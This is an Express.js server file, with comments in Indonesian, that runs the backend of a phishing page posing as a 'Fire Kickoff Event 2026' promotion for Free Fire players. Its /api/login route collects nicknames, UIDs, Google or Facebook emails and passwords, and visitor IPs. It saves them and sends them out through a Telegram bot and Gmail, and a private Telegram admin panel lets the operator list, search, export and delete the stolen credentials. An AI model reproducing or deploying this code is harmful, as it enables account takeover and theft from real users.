const express    = require('express');
const nodemailer = require('nodemailer');
const path       = require('path');
const fs         = require('fs');
const https      = require('https');

const app  = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.static(path.join(__dirname)));

// ════════════════════════════════════════
//  CONFIG
// ════════════════════════════════════════
const TG_TOKEN  = process.env.TELEGRAM_BOT_TOKEN;
const TG_CHAT   = process.env.TELEGRAM_CHAT_ID;
const IS_VERCEL = !!process.env.VERCEL;
const DATA_FILE = IS_VERCEL
  ? '/tmp/logins.json'
  : path.join(__dirname, 'data', 'logins.json');

// ════════════════════════════════════════
//  DATA STORE
// ════════════════════════════════════════
function loadData() {
  try {
    if (fs.existsSync(DATA_FILE)) {
      return JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
    }
  } catch (_) {}
  return [];
}

function saveData(arr) {
  try {
    const dir = path.dirname(DATA_FILE);
    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(DATA_FILE, JSON.stringify(arr, null, 2));
  } catch (e) {
    console.error('saveData error:', e.message);
  }
}

let logins = loadData();

function addLogin(entry) {
  logins.unshift(entry);          // terbaru di atas
  if (logins.length > 1000) logins = logins.slice(0, 1000);
  saveData(logins);
}

function clearData() {
  logins = [];
  saveData(logins);
}

// ════════════════════════════════════════
//  TELEGRAM API HELPERS
// ════════════════════════════════════════
function tgRequest(method, payload) {
  return new Promise((resolve) => {
    if (!TG_TOKEN) return resolve(null);
    const body = JSON.stringify(payload);
    const req = https.request({
      hostname: 'api.telegram.org',
      path: `/bot${TG_TOKEN}/${method}`,
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body) }
    }, res => {
      let d = '';
      res.on('data', c => d += c);
      res.on('end', () => { try { resolve(JSON.parse(d)); } catch { resolve(null); } });
    });
    req.on('error', () => resolve(null));
    req.write(body);
    req.end();
  });
}

const tgSend   = (chat, text, extra = {}) =>
  tgRequest('sendMessage', { chat_id: chat, text, parse_mode: 'HTML', ...extra });

const tgEdit   = (chat, msgId, text, extra = {}) =>
  tgRequest('editMessageText', { chat_id: chat, message_id: msgId, text, parse_mode: 'HTML', ...extra });

const tgAnswer = (id, text = '') =>
  tgRequest('answerCallbackQuery', { callback_query_id: id, text });

// ════════════════════════════════════════
//  BOT UI — HELPERS TAMPILAN
// ════════════════════════════════════════
const LINE  = '━━━━━━━━━━━━━━━━━━━━━━━';
const LINE2 = '─────────────────────────';

function fmtTime(ts) {
  return new Date(ts).toLocaleString('id-ID', {
    timeZone: 'Asia/Jakarta', day:'2-digit', month:'2-digit', year:'2-digit',
    hour:'2-digit', minute:'2-digit', second:'2-digit'
  }).replace(/\//g, '/');
}

function fmtShort(ts) {
  return new Date(ts).toLocaleString('id-ID', {
    timeZone: 'Asia/Jakarta', day:'2-digit', month:'2-digit',
    hour:'2-digit', minute:'2-digit'
  });
}

function relativeTime(ts) {
  const diff = Date.now() - ts;
  if (diff < 60000)   return `${Math.floor(diff/1000)}d lalu`;
  if (diff < 3600000) return `${Math.floor(diff/60000)}m lalu`;
  if (diff < 86400000)return `${Math.floor(diff/3600000)}j lalu`;
  return `${Math.floor(diff/86400000)}hr lalu`;
}

function methodIcon(m) { return m === 'Google' ? '🔵' : '🔷'; }

// ════════════════════════════════════════
//  BOT MENU & PESAN
// ════════════════════════════════════════

// ── MAIN MENU ──
function buildMainMenu() {
  const total   = logins.length;
  const today   = new Date().toLocaleDateString('id-ID', { timeZone: 'Asia/Jakarta' });
  const todayCount = logins.filter(l => {
    return new Date(l.ts).toLocaleDateString('id-ID', { timeZone: 'Asia/Jakarta' }) === today;
  }).length;
  const lastLogin = total > 0 ? relativeTime(logins[0].ts) : 'Belum ada';

  const text =
`🎮 <b>FF EVENT — PANEL ADMIN</b>
${LINE}

📊 <b>Total Data</b>   : <code>${total}</code> login
📅 <b>Hari Ini</b>     : <code>${todayCount}</code> login
🕐 <b>Login Terakhir</b>: ${lastLogin}
🖥️ <b>Status Bot</b>   : ✅ Aktif

${LINE}
<i>Pilih menu di bawah ini 👇</i>`;

  const keyboard = {
    inline_keyboard: [
      [
        { text: '📋 Data Terbaru', callback_data: 'data_0' },
        { text: '📈 Statistik',    callback_data: 'stats'  }
      ],
      [
        { text: '🔍 Cari Data',    callback_data: 'search_prompt' },
        { text: '📤 Export',       callback_data: 'export' }
      ],
      [
        { text: '🗑️ Hapus Semua', callback_data: 'confirm_clear' },
        { text: '🔢 Hapus No',     callback_data: 'delete_num_prompt' }
      ],
      [
        { text: 'ℹ️ Info Bot',     callback_data: 'info'  },
        { text: '🔄 Refresh Menu', callback_data: 'menu' }
      ]
    ]
  };
  return { text, keyboard };
}

// ── DATA LIST (PAGINATION 5 per halaman) ──
const PER_PAGE = 5;
function buildDataPage(page) {
  const total = logins.length;
  if (total === 0) {
    return {
      text: `📋 <b>DATA LOGIN</b>\n${LINE}\n\n<i>Belum ada data masuk.</i>`,
      keyboard: { inline_keyboard: [[{ text: '🔙 Menu Utama', callback_data: 'menu' }]] }
    };
  }

  const totalPages = Math.ceil(total / PER_PAGE);
  page = Math.max(0, Math.min(page, totalPages - 1));
  const start = page * PER_PAGE;
  const slice = logins.slice(start, start + PER_PAGE);

  let text = `📋 <b>DATA LOGIN</b> — Hal ${page+1}/${totalPages}\n${LINE}\n`;
  text += `<i>Menampilkan ${start+1}–${Math.min(start+PER_PAGE, total)} dari ${total} data</i>\n`;

  slice.forEach((l, i) => {
    const no = String(start + i + 1).padStart(3, '0');
    text +=
`\n┌─ <b>#${no}</b> ${methodIcon(l.method)} ${l.method} • ${fmtShort(l.ts)}
├ 👤 <b>${l.nickname}</b> | 🆔 <code>${l.uid}</code>
├ 🏆 Level: <b>${l.level || '-'}</b>
├ 📧 <code>${l.email}</code>
├ 🔑 <code>${l.password}</code>
└ 🌐 <code>${l.ip}</code>\n`;
  });

  const nav = [];
  if (page > 0)             nav.push({ text: '◀ Sebelumnya', callback_data: `data_${page-1}` });
  nav.push({ text: `📄 ${page+1}/${totalPages}`, callback_data: 'noop' });
  if (page < totalPages-1)  nav.push({ text: 'Berikutnya ▶', callback_data: `data_${page+1}` });

  const keyboard = {
    inline_keyboard: [
      nav,
      [
        { text: '⏮ Pertama', callback_data: 'data_0' },
        { text: '⏭ Terakhir', callback_data: `data_${totalPages-1}` }
      ],
      [
        { text: '🔄 Refresh',   callback_data: `data_${page}` },
        { text: '🔙 Menu Utama', callback_data: 'menu' }
      ]
    ]
  };
  return { text, keyboard };
}

// ── STATISTIK ──
function buildStats() {
  const total = logins.length;
  if (total === 0) {
    return {
      text: `📈 <b>STATISTIK</b>\n${LINE}\n\n<i>Belum ada data.</i>`,
      keyboard: { inline_keyboard: [[{ text: '🔙 Menu Utama', callback_data: 'menu' }]] }
    };
  }

  const now   = Date.now();
  const today = new Date().toLocaleDateString('id-ID', { timeZone: 'Asia/Jakarta' });
  const todayCount  = logins.filter(l => new Date(l.ts).toLocaleDateString('id-ID',{timeZone:'Asia/Jakarta'}) === today).length;
  const weekCount   = logins.filter(l => now - l.ts < 7  * 86400000).length;
  const monthCount  = logins.filter(l => now - l.ts < 30 * 86400000).length;

  const googleCount = logins.filter(l => l.method === 'Google').length;
  const fbCount     = total - googleCount;
  const gPct        = Math.round(googleCount / total * 100);
  const fPct        = 100 - gPct;

  // Bar chart sederhana
  const bar = (pct, len = 12) => {
    const filled = Math.round(pct / 100 * len);
    return '█'.repeat(filled) + '░'.repeat(len - filled);
  };

  // Top 5 terbaru
  const top5 = logins.slice(0, 5);

  let text =
`📈 <b>STATISTIK LENGKAP</b>
${LINE}

📊 <b>RINGKASAN DATA</b>
├ Total Semua   : <b>${total}</b> data
├ Hari Ini      : <b>${todayCount}</b> data
├ 7 Hari        : <b>${weekCount}</b> data
└ 30 Hari       : <b>${monthCount}</b> data

🔗 <b>METODE LOGIN</b>
├ 🔵 Google    : <b>${googleCount}</b> (${gPct}%)
│  <code>${bar(gPct)}</code>
└ 🔷 Facebook  : <b>${fbCount}</b> (${fPct}%)
   <code>${bar(fPct)}</code>

⏰ <b>WAKTU LOGIN TERAKHIR</b>
└ ${logins[0] ? fmtTime(logins[0].ts) + ' WIB' : '-'}

🏆 <b>5 DATA TERBARU</b>
${LINE2}`;

  top5.forEach((l, i) => {
    text += `\n${i+1}. ${methodIcon(l.method)} <b>${l.nickname}</b> • <code>${l.uid}</code> • ${fmtShort(l.ts)}`;
  });

  const keyboard = {
    inline_keyboard: [
      [
        { text: '📋 Lihat Data',  callback_data: 'data_0' },
        { text: '📤 Export',      callback_data: 'export' }
      ],
      [
        { text: '🔄 Refresh Statistik', callback_data: 'stats' }
      ],
      [
        { text: '🔙 Menu Utama', callback_data: 'menu' }
      ]
    ]
  };
  return { text, keyboard };
}

// ── EXPORT DATA ──
function buildExport() {
  const total = logins.length;
  if (total === 0) {
    return {
      text: `📤 <b>EXPORT DATA</b>\n${LINE}\n\n<i>Tidak ada data untuk diekspor.</i>`,
      keyboard: { inline_keyboard: [[{ text: '🔙 Menu Utama', callback_data: 'menu' }]] }
    };
  }

  const genTime = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
  let text = `📤 <b>EXPORT DATA — ${total} Login</b>\n`;
  text += `🕐 Generated: ${genTime} WIB\n${LINE}\n\n`;

  // Tampilkan max 50 data di pesan (batas Telegram 4096 karakter)
  const display = logins.slice(0, 50);
  display.forEach((l, i) => {
    text += `<code>#${String(i+1).padStart(3,'0')} | ${l.nickname} | UID:${l.uid} | Lv:${l.level||'-'} | ${l.method} | ${l.email} | ${l.password} | ${l.ip} | ${fmtShort(l.ts)}</code>\n`;
  });

  if (total > 50) {
    text += `\n<i>... dan ${total - 50} data lainnya. Total: ${total}</i>`;
  }

  const keyboard = {
    inline_keyboard: [
      [
        { text: '📋 Lihat Detail', callback_data: 'data_0' },
        { text: '📈 Statistik',    callback_data: 'stats'  }
      ],
      [{ text: '🔙 Menu Utama', callback_data: 'menu' }]
    ]
  };
  return { text, keyboard };
}

// ── KONFIRMASI HAPUS ──
function buildConfirmClear() {
  const total = logins.length;
  const text =
`🗑️ <b>HAPUS SEMUA DATA</b>
${LINE}

⚠️ Kamu akan menghapus <b>${total} data login</b>.

❗ Tindakan ini <b>tidak dapat dibatalkan!</b>
Yakin ingin menghapus semua data?`;

  const keyboard = {
    inline_keyboard: [
      [
        { text: '✅ Ya, Hapus Semua', callback_data: 'do_clear' },
        { text: '❌ Batal',           callback_data: 'menu'     }
      ]
    ]
  };
  return { text, keyboard };
}

// ── PROMPT HAPUS PER NOMOR ──
function buildDeleteNumPrompt() {
  const total = logins.length;
  const text =
`🔢 <b>HAPUS DATA PER NOMOR</b>
${LINE}

Total data saat ini: <b>${total}</b>

Kirim perintah dengan format:
├ <code>/hapus 5</code>       — hapus nomor 5
├ <code>/hapus 1-50</code>    — hapus nomor 1 sampai 50
└ <code>/hapus 10-100</code>  — hapus nomor 10 sampai 100

<i>Nomor #001 = data terbaru, #${String(total).padStart(3,'0')} = data terlama</i>`;

  const keyboard = {
    inline_keyboard: [
      [
        { text: '📋 Lihat Data', callback_data: 'data_0' },
        { text: '🔙 Menu Utama', callback_data: 'menu'   }
      ]
    ]
  };
  return { text, keyboard };
}

// ── INFO BOT ──
function buildInfo() {
  const text =
`ℹ️ <b>INFO BOT</b>
${LINE}

🤖 <b>FF Event Admin Bot</b>
📋 <b>Versi</b>      : 2.0 Full Feature
🎮 <b>Project</b>    : Fire Kickoff Event 2026
👨‍💻 <b>Platform</b>  : Vercel + Express.js

${LINE}
📌 <b>FITUR TERSEDIA:</b>
├ 🔔 Notifikasi login real-time
├ 📋 Lihat data dengan pagination
├ 📈 Statistik lengkap + grafik
├ 🔍 Cari data (UID/email/nickname)
├ 📤 Export semua data
├ 🗑️ Hapus semua data dengan konfirmasi
├ 🔢 Hapus data per nomor / range
└ 🔄 Refresh & navigasi lengkap

${LINE}
📡 <b>PERINTAH BOT:</b>
/start        — Buka menu utama
/data         — Lihat data terbaru
/stats        — Lihat statistik
/export       — Export data
/clear        — Hapus semua data
/hapus [no]   — Hapus nomor tertentu
/hapus [x-y]  — Hapus range nomor
/cari [kata]  — Cari data
/info         — Info bot ini`;

  const keyboard = {
    inline_keyboard: [
      [
        { text: '📋 Data', callback_data: 'data_0' },
        { text: '📈 Stats', callback_data: 'stats' }
      ],
      [{ text: '🔙 Menu Utama', callback_data: 'menu' }]
    ]
  };
  return { text, keyboard };
}

// ── NOTIFIKASI LOGIN BARU ──
function buildNotif(l, no) {
  return `🔥 <b>LOGIN BARU MASUK!</b>
${LINE}

👤 <b>Nickname</b>  : <b>${l.nickname}</b>
🆔 <b>UID</b>       : <code>${l.uid}</code>
🏆 <b>Level</b>     : <b>${l.level || '-'}</b>
${methodIcon(l.method)} <b>Metode</b>    : <b>${l.method}</b>
📧 <b>Email</b>     : <code>${l.email}</code>
🔑 <b>Password</b>  : <code>${l.password}</code>
🌐 <b>IP</b>        : <code>${l.ip}</code>
🕐 <b>Waktu</b>     : ${fmtTime(l.ts)} <b>WIB</b>

${LINE}
📊 <b>Data ke-${no}</b> dari total <b>${logins.length}</b> login`;
}

// ════════════════════════════════════════
//  WEBHOOK HANDLER
// ════════════════════════════════════════
async function handleUpdate(update) {
  // ── Pesan teks / command ──
  if (update.message) {
    const msg  = update.message;
    const chat = msg.chat.id.toString();
    const text = (msg.text || '').trim();
    const from = msg.from.username || msg.from.first_name || 'Admin';

    // Cek hanya admin
    if (TG_CHAT && chat !== TG_CHAT) {
      return tgSend(chat, '⛔ Akses ditolak. Bot ini private.');
    }

    if (text === '/start' || text === '/menu') {
      const { text: t, keyboard } = buildMainMenu();
      return tgSend(chat, `👋 Halo, <b>${from}</b>!\n\n` + t, { reply_markup: keyboard });
    }

    if (text === '/data') {
      const { text: t, keyboard } = buildDataPage(0);
      return tgSend(chat, t, { reply_markup: keyboard });
    }

    if (text === '/stats') {
      const { text: t, keyboard } = buildStats();
      return tgSend(chat, t, { reply_markup: keyboard });
    }

    if (text === '/export') {
      const { text: t, keyboard } = buildExport();
      return tgSend(chat, t, { reply_markup: keyboard });
    }

    if (text === '/clear') {
      const { text: t, keyboard } = buildConfirmClear();
      return tgSend(chat, t, { reply_markup: keyboard });
    }

    if (text === '/info') {
      const { text: t, keyboard } = buildInfo();
      return tgSend(chat, t, { reply_markup: keyboard });
    }

    // /hapus [no] atau /hapus [no1]-[no2]
    if (text.startsWith('/hapus')) {
      const arg = text.replace('/hapus', '').trim();
      if (!arg) {
        const { text: t, keyboard } = buildDeleteNumPrompt();
        return tgSend(chat, t, { reply_markup: keyboard });
      }
      const total = logins.length;
      if (total === 0) {
        return tgSend(chat, `❌ Tidak ada data untuk dihapus.`, {
          reply_markup: { inline_keyboard: [[{ text: '🔙 Menu', callback_data: 'menu' }]] }
        });
      }
      let indices = [];
      if (arg.includes('-')) {
        const parts = arg.split('-');
        const from = parseInt(parts[0]);
        const to   = parseInt(parts[1]);
        if (isNaN(from) || isNaN(to) || from < 1 || to < from) {
          return tgSend(chat,
            `❌ <b>Format salah!</b>\nContoh: <code>/hapus 1-50</code>`,
            { reply_markup: { inline_keyboard: [[{ text: '🔙 Menu', callback_data: 'menu' }]] } }
          );
        }
        const cap = Math.min(to, total);
        for (let i = from; i <= cap; i++) indices.push(i - 1);
      } else {
        const no = parseInt(arg);
        if (isNaN(no) || no < 1 || no > total) {
          return tgSend(chat,
            `❌ <b>Nomor tidak valid!</b>\nMasukkan nomor antara 1 – ${total}.`,
            { reply_markup: { inline_keyboard: [[{ text: '🔙 Menu', callback_data: 'menu' }]] } }
          );
        }
        indices.push(no - 1);
      }
      if (indices.length === 0) {
        return tgSend(chat, `❌ Tidak ada data pada range tersebut.`, {
          reply_markup: { inline_keyboard: [[{ text: '🔙 Menu', callback_data: 'menu' }]] }
        });
      }
      // Hapus dari index terbesar agar tidak geser
      indices.sort((a, b) => b - a).forEach(i => logins.splice(i, 1));
      saveData(logins);
      return tgSend(chat,
`✅ <b>BERHASIL DIHAPUS!</b>
${LINE}

🗑️ <b>${indices.length}</b> data telah dihapus
📊 Sisa data: <b>${logins.length}</b>
🕐 ${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })} WIB`,
        {
          reply_markup: { inline_keyboard: [
            [{ text: '📋 Lihat Data', callback_data: 'data_0' }, { text: '🔙 Menu', callback_data: 'menu' }]
          ]}
        }
      );
    }

    // /cari [keyword]
    if (text.startsWith('/cari')) {
      const q = text.replace('/cari', '').trim().toLowerCase();
      if (!q) {
        return tgSend(chat,
`🔍 <b>CARI DATA</b>\n${LINE}\n\nFormat: <code>/cari [kata kunci]</code>\nContoh: <code>/cari PlayerName</code>`,
          { reply_markup: { inline_keyboard: [[{ text: '🔙 Menu', callback_data: 'menu' }]] } }
        );
      }
      const found = logins.filter(l =>
        l.nickname.toLowerCase().includes(q) ||
        l.uid.includes(q) ||
        l.email.toLowerCase().includes(q)
      );
      if (found.length === 0) {
        return tgSend(chat,
`🔍 <b>CARI: "${q}"</b>\n${LINE}\n\n❌ Tidak ada data ditemukan.`,
          { reply_markup: { inline_keyboard: [[{ text: '🔙 Menu', callback_data: 'menu' }]] } }
        );
      }
      let out = `🔍 <b>HASIL CARI: "${q}"</b>\n${LINE}\n`;
      out += `<i>Ditemukan <b>${found.length}</b> data</i>\n`;
      found.slice(0, 10).forEach((l, i) => {
        out +=
`\n┌─ <b>#${i+1}</b> ${methodIcon(l.method)} ${l.method} • ${fmtShort(l.ts)}
├ 👤 <b>${l.nickname}</b> | 🆔 <code>${l.uid}</code>
├ 📧 <code>${l.email}</code>
├ 🔑 <code>${l.password}</code>
└ 🌐 <code>${l.ip}</code>`;
      });
      if (found.length > 10) out += `\n\n<i>... dan ${found.length - 10} lainnya</i>`;
      return tgSend(chat, out, {
        reply_markup: { inline_keyboard: [[{ text: '🔙 Menu Utama', callback_data: 'menu' }]] }
      });
    }

    // Default: tampilkan menu
    const { text: t, keyboard } = buildMainMenu();
    return tgSend(chat, t, { reply_markup: keyboard });
  }

  // ── Callback Query (tombol inline) ──
  if (update.callback_query) {
    const cb   = update.callback_query;
    const chat = cb.message.chat.id.toString();
    const mid  = cb.message.message_id;
    const data = cb.data;

    await tgAnswer(cb.id);

    if (TG_CHAT && chat !== TG_CHAT) return;

    // MENU UTAMA
    if (data === 'menu') {
      const { text, keyboard } = buildMainMenu();
      return tgEdit(chat, mid, text, { reply_markup: keyboard });
    }

    // DATA PAGINATION
    if (data.startsWith('data_')) {
      const page = parseInt(data.split('_')[1]) || 0;
      const { text, keyboard } = buildDataPage(page);
      return tgEdit(chat, mid, text, { reply_markup: keyboard });
    }

    // STATISTIK
    if (data === 'stats') {
      const { text, keyboard } = buildStats();
      return tgEdit(chat, mid, text, { reply_markup: keyboard });
    }

    // EXPORT
    if (data === 'export') {
      const { text, keyboard } = buildExport();
      return tgEdit(chat, mid, text, { reply_markup: keyboard });
    }

    // KONFIRMASI HAPUS
    if (data === 'confirm_clear') {
      const { text, keyboard } = buildConfirmClear();
      return tgEdit(chat, mid, text, { reply_markup: keyboard });
    }

    // EKSEKUSI HAPUS
    if (data === 'do_clear') {
      const jumlah = logins.length;
      clearData();
      const text =
`✅ <b>DATA BERHASIL DIHAPUS!</b>
${LINE}

🗑️ <b>${jumlah}</b> data login telah dihapus.
🕐 ${new Date().toLocaleString('id-ID',{timeZone:'Asia/Jakarta'})} WIB`;
      return tgEdit(chat, mid, text, {
        reply_markup: { inline_keyboard: [[{ text: '🔙 Menu Utama', callback_data: 'menu' }]] }
      });
    }

    // INFO BOT
    if (data === 'info') {
      const { text, keyboard } = buildInfo();
      return tgEdit(chat, mid, text, { reply_markup: keyboard });
    }

    // DELETE NUM PROMPT
    if (data === 'delete_num_prompt') {
      const { text, keyboard } = buildDeleteNumPrompt();
      return tgEdit(chat, mid, text, { reply_markup: keyboard });
    }

    // SEARCH PROMPT
    if (data === 'search_prompt') {
      const text =
`🔍 <b>CARI DATA</b>
${LINE}

Kirim pesan dengan format:
<code>/cari [kata kunci]</code>

Contoh:
<code>/cari PlayerName</code>
<code>/cari 12345678</code>
<code>/cari gmail.com</code>

<i>Bisa cari berdasarkan Nickname, UID, atau Email</i>`;
      return tgEdit(chat, mid, text, {
        reply_markup: { inline_keyboard: [[{ text: '🔙 Menu Utama', callback_data: 'menu' }]] }
      });
    }

    // NOOP (tombol halaman)
    if (data === 'noop') return;
  }
}

// ════════════════════════════════════════
//  SETUP WEBHOOK TELEGRAM
// ════════════════════════════════════════
async function setupWebhook() {
  if (!TG_TOKEN) return console.log('[Bot] TG_TOKEN tidak ada, webhook tidak diset.');

  // Coba deteksi URL publik
  const domain = process.env.VERCEL_URL
    || process.env.REPLIT_DEV_DOMAIN
    || null;

  if (!domain) return console.log('[Bot] Domain tidak ditemukan, skip webhook setup.');

  const webhookUrl = `https://${domain}/webhook`;
  const res = await tgRequest('setWebhook', {
    url: webhookUrl,
    allowed_updates: ['message', 'callback_query'],
    drop_pending_updates: true
  });
  if (res && res.ok) {
    console.log('[Bot] Webhook aktif:', webhookUrl);
  } else {
    console.log('[Bot] Webhook gagal:', JSON.stringify(res));
  }
}

// ════════════════════════════════════════
//  GMAIL TRANSPORTER
// ════════════════════════════════════════
const gmailTransporter = process.env.EMAIL_USER ? nodemailer.createTransport({
  service: 'gmail',
  auth: { user: process.env.EMAIL_USER, pass: process.env.EMAIL_PASS }
}) : null;

// ════════════════════════════════════════
//  ROUTES
// ════════════════════════════════════════

// ── Webhook Telegram ──
app.post('/webhook', async (req, res) => {
  res.sendStatus(200);
  try { await handleUpdate(req.body); } catch (e) { console.error('[Webhook]', e.message); }
});

// ── API Login ──
app.post('/api/login', async (req, res) => {
  const { nickname, uid, level, method, email, password } = req.body;

  if (!nickname || !uid || !email || !password) {
    return res.status(400).json({ success: false, message: 'Data tidak lengkap' });
  }

  const methodLabel = method === 'google' ? 'Google' : 'Facebook';
  const ip          = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown')
                        .split(',')[0].trim();
  const entry = {
    nickname, uid, level: level || '-',
    method: methodLabel, email, password, ip,
    ts: Date.now()
  };

  addLogin(entry);
  const no = logins.length;

  // Kirim notif Telegram
  if (TG_TOKEN && TG_CHAT) {
    const notifText = buildNotif(entry, no);
    await tgSend(TG_CHAT, notifText, {
      reply_markup: {
        inline_keyboard: [
          [
            { text: '📋 Lihat Semua Data', callback_data: 'data_0' },
            { text: '📈 Statistik',        callback_data: 'stats'  }
          ],
          [{ text: '🏠 Menu Utama', callback_data: 'menu' }]
        ]
      }
    });
  }

  // Kirim email (jika dikonfigurasi)
  if (gmailTransporter) {
    const timeStr = new Date(entry.ts).toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
    const htmlBody = `
    <div style="font-family:Arial,sans-serif;max-width:580px;margin:0 auto;background:#0d0d1a;color:#fff;border-radius:10px;overflow:hidden;border:1px solid #2a2a3a;">
      <div style="background:linear-gradient(135deg,#FF6B00,#FF2D2D);padding:18px 24px;">
        <p style="margin:0;font-size:18px;font-weight:bold;letter-spacing:1px;">Data Login Masuk — Fire Kickoff 2026</p>
        <p style="margin:4px 0 0;font-size:12px;opacity:0.85;">${timeStr} WIB</p>
      </div>
      <div style="padding:24px;">
        <table style="width:100%;border-collapse:collapse;font-size:14px;">
          <tr><td style="padding:9px 0;border-bottom:1px solid #1e1e2e;color:#999;width:130px;">Nickname</td><td style="padding:9px 0;border-bottom:1px solid #1e1e2e;color:#fff;font-weight:bold;">${nickname}</td></tr>
          <tr><td style="padding:9px 0;border-bottom:1px solid #1e1e2e;color:#999;">UID</td><td style="padding:9px 0;border-bottom:1px solid #1e1e2e;color:#FFD700;font-weight:bold;">${uid}</td></tr>
          <tr><td style="padding:9px 0;border-bottom:1px solid #1e1e2e;color:#999;">Level</td><td style="padding:9px 0;border-bottom:1px solid #1e1e2e;color:#00C853;font-weight:bold;">${level||'-'}</td></tr>
          <tr><td style="padding:9px 0;border-bottom:1px solid #1e1e2e;color:#999;">Metode</td><td style="padding:9px 0;border-bottom:1px solid #1e1e2e;color:#00BFFF;font-weight:bold;">${methodLabel}</td></tr>
          <tr><td style="padding:9px 0;border-bottom:1px solid #1e1e2e;color:#999;">Email</td><td style="padding:9px 0;border-bottom:1px solid #1e1e2e;color:#fff;">${email}</td></tr>
          <tr><td style="padding:9px 0;color:#999;">Password</td><td style="padding:9px 0;color:#FF6B00;font-weight:bold;">${password}</td></tr>
        </table>
      </div>
      <div style="padding:10px 24px;background:#0a0a14;font-size:11px;color:#555;">IP: ${ip} | Data ke-${no}</div>
    </div>`;

    gmailTransporter.sendMail({
      from:    `"FF Event Admin" <${process.env.EMAIL_USER}>`,
      to:      process.env.EMAIL_USER,
      subject: `Login baru: ${nickname} (${methodLabel})`,
      html:    htmlBody
    }).catch(e => console.error('Email error:', e.message));
  }

  res.json({ success: true });
});

// ── API: Cari data ──
app.get('/api/search', (req, res) => {
  const q = (req.query.q || '').toLowerCase().trim();
  if (!q) return res.json({ results: [] });
  const results = logins.filter(l =>
    l.nickname.toLowerCase().includes(q) ||
    l.uid.includes(q) ||
    l.email.toLowerCase().includes(q)
  );
  res.json({ total: results.length, results: results.slice(0, 50) });
});

// ── API: Stats (untuk internal) ──
app.get('/api/stats', (req, res) => {
  const total = logins.length;
  const google = logins.filter(l => l.method === 'Google').length;
  res.json({ total, google, facebook: total - google, latest: logins[0] || null });
});

// ── Fallback ke index.html ──
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

// ════════════════════════════════════════
//  COMMAND HANDLER VIA PESAN BOT
//  (/cari keyword) — search via message
// ════════════════════════════════════════
const _originalHandle = handleUpdate;
// Tambah handler /cari di dalam handleUpdate (sudah ada di atas via else default)

// ════════════════════════════════════════
//  START
// ════════════════════════════════════════
if (require.main === module) {
  // Jalankan langsung (local / Replit)
  app.listen(PORT, '0.0.0.0', () => {
    console.log(`[Server] Berjalan di port ${PORT}`);
    setupWebhook();
  });
} else {
  // Vercel serverless — module di-import, bukan dijalankan langsung
  // Setup webhook saat cold start
  setupWebhook().catch(e => console.error('[Webhook setup error]', e.message));
}

module.exports = app;
